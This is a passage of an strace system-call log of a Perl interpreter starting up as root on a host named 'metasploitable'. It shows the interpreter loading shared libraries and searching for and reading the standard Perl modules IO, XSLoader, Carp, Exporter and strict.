\250\24\0\24(`\0\0P\240\312DB", 512) = 512
6692  07:15:04.941128 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
6692  07:15:04.941146 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e46000
6692  07:15:04.941157 mmap2(0xb7f8f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f8f000
6692  07:15:04.941173 mmap2(0xb7f92000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f92000
6692  07:15:04.941186 close(1)          = 0
6692  07:15:04.941198 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6692  07:15:04.941211 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
6692  07:15:04.941225 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
6692  07:15:04.941366 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
6692  07:15:04.941384 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e14000
6692  07:15:04.941396 mmap2(0xb7e1d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e1d000
6692  07:15:04.941412 mmap2(0xb7e1f000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e1f000
6692  07:15:04.941429 close(1)          = 0
6692  07:15:04.941454 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e13000
6692  07:15:04.941468 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e138c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
6692  07:15:04.941543 mprotect(0xb7f8f000, 4096, PROT_READ) = 0
6692  07:15:04.941571 munmap(0xb7fd7000, 29913) = 0
6692  07:15:04.941584 set_tid_address(0xb7e13908) = 6692
6692  07:15:04.941593 set_robust_list(0xb7e13910, 0xc) = 0
6692  07:15:04.941603 futex(0xbfe79b10, 0x81 /* FUTEX_??? */, 1) = 0
6692  07:15:04.941617 rt_sigaction(SIGRTMIN, {0xb7f992c0, [], SA_SIGINFO}, NULL, 8) = 0
6692  07:15:04.941630 rt_sigaction(SIGRT_1, {0xb7f99340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
6692  07:15:04.941642 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
6692  07:15:04.941657 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
6692  07:15:04.941677 uname({sys="Linux", node="metasploitable", ...}) = 0
6692  07:15:04.941724 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
6692  07:15:04.941798 brk(0)            = 0x8153000
6692  07:15:04.941809 brk(0x8174000)    = 0x8174000
6692  07:15:04.941869 getuid32()        = 0
6692  07:15:04.941879 geteuid32()       = 0
6692  07:15:04.941888 getgid32()        = 0
6692  07:15:04.941897 getegid32()       = 0
6692  07:15:04.941934 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7df2000
6692  07:15:04.941963 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
6692  07:15:04.941980 read(1, "\212\n\320\207", 4) = 4
6692  07:15:04.941994 close(1)          = 0
6692  07:15:04.942016 time(NULL)        = 1495624504
6692  07:15:04.942059 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfe797e0) = -1 ENOENT (No such file or directory)
6692  07:15:04.942077 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfe797e0) = -1 ENOENT (No such file or directory)
6692  07:15:04.942090 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfe797e0) = -1 ENOENT (No such file or directory)
6692  07:15:04.942106 stat64("/usr/local/lib/perl/5.8.7", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942119 stat64("/usr/local/share/perl/5.8.7", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942147 stat64("/usr/local/lib/perl/5.8.6", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942160 stat64("/usr/local/share/perl/5.8.6", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942171 stat64("/usr/local/lib/perl/5.8.4", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942183 stat64("/usr/local/share/perl/5.8.4", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942195 stat64("/usr/local/lib/perl/5.8.3", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942207 stat64("/usr/local/share/perl/5.8.3", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942219 stat64("/usr/local/lib/perl/5.8.2", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942231 stat64("/usr/local/share/perl/5.8.2", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942252 stat64("/usr/local/lib/perl/5.8.1", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942264 stat64("/usr/local/share/perl/5.8.1", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942276 stat64("/usr/local/lib/perl/5.8.0", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942288 stat64("/usr/local/share/perl/5.8.0", 0xbfe79920) = -1 ENOENT (No such file or directory)
6692  07:15:04.942311 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe79618) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.942325 _llseek(0, 0, [0], SEEK_CUR) = 0
6692  07:15:04.942338 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe79618) = -1 EBADF (Bad file descriptor)
6692  07:15:04.942357 _llseek(1, 0, 0xbfe79660, SEEK_CUR) = -1 EBADF (Bad file descriptor)
6692  07:15:04.942368 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe79618) = -1 EINVAL (Invalid argument)
6692  07:15:04.942379 _llseek(2, 0, 0xbfe79660, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6692  07:15:04.942390 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
6692  07:15:04.942403 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe796d8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.942413 _llseek(1, 0, [0], SEEK_CUR) = 0
6692  07:15:04.942425 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
6692  07:15:04.942437 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
6692  07:15:04.942456 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
6692  07:15:04.942508 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
6692  07:15:04.942554 getppid()         = 6690
6692  07:15:04.942616 stat64("/etc/perl/IO.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942641 stat64("/etc/perl/IO.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942655 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942668 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942682 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942694 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942708 stat64("/usr/lib/perl5/IO.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942721 stat64("/usr/lib/perl5/IO.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942760 stat64("/usr/share/perl5/IO.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942790 stat64("/usr/share/perl5/IO.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942804 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.942817 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
6692  07:15:04.942839 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.942853 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.942878 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.942902 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
6692  07:15:04.942960 stat64("/etc/perl/XSLoader.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.942973 stat64("/etc/perl/XSLoader.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.942987 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943000 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943015 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943028 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943042 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943054 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943068 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943080 stat64("/usr/share/perl5/XSLoader.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943094 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943112 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
6692  07:15:04.943133 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.943147 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.943158 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.943176 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
6692  07:15:04.943479 brk(0x8195000)    = 0x8195000
6692  07:15:04.943837 _llseek(8, 3407, [3407], SEEK_SET) = 0
6692  07:15:04.943855 _llseek(8, 0, [3407], SEEK_CUR) = 0
6692  07:15:04.943866 close(8)          = 0
6692  07:15:04.943912 stat64("/etc/perl/Carp.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943927 stat64("/etc/perl/Carp.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943942 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943954 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943969 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943982 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.943996 stat64("/usr/lib/perl5/Carp.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.944008 stat64("/usr/lib/perl5/Carp.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.944021 stat64("/usr/share/perl5/Carp.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.944033 stat64("/usr/share/perl5/Carp.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.944047 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.944059 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.944073 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.944086 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
6692  07:15:04.944107 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.944121 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.944133 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.944150 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
6692  07:15:04.944637 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
6692  07:15:04.949615 read(8, "", 4096) = 0
6692  07:15:04.949656 close(8)          = 0
6692  07:15:04.949679 stat64("/etc/perl/Exporter.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949694 stat64("/etc/perl/Exporter.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949707 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949720 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949734 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949747 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949761 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949773 stat64("/usr/lib/perl5/Exporter.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949786 stat64("/usr/share/perl5/Exporter.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949798 stat64("/usr/share/perl5/Exporter.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949811 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949824 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949837 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.949850 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
6692  07:15:04.949871 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.949885 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.949903 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.949920 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
6692  07:15:04.950449 _llseek(8, 2217, [2217], SEEK_SET) = 0
6692  07:15:04.950466 _llseek(8, 0, [2217], SEEK_CUR) = 0
6692  07:15:04.950477 close(8)          = 0
6692  07:15:04.950633 stat64("/etc/perl/strict.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950651 stat64("/etc/perl/strict.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950665 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950691 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950705 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950718 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950731 stat64("/usr/lib/perl5/strict.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950743 stat64("/usr/lib/perl5/strict.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950756 stat64("/usr/share/perl5/strict.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.950768 stat64("/usr/share/perl5/strict.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
